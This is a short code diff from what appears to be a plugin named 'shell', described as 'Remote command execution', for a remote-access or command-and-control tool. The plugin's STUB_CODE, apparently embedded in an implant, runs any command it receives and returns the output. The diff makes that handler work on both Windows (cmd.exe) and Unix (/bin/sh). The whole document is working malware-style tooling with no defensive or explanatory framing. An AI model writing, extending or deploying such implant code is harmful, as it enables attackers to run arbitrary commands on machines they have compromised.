@@ -3,7 +3,12 @@ PLUGIN = {"name": "shell", "desc": "Remote command execution", "deps": [], "size
 STUB_CODE = r"""
 def _cmd_shell(m):
     try:
-        r = subprocess.run(m["cmd"], shell=True, capture_output=True, text=True, timeout=120)
+        cmd = m["cmd"]
+        import platform as _pf
+        if _pf.system() == "Windows":
+            r = subprocess.run(["cmd.exe", "/c", cmd], capture_output=True, text=True, timeout=120)
+        else:
+            r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=120)
         return {"output": (r.stdout + r.stderr) or "(no output)"}
     except subprocess.TimeoutExpired: return {"output": "[!] Timed out"}
     except Exception as e: return {"output": f"[!] {e}"}
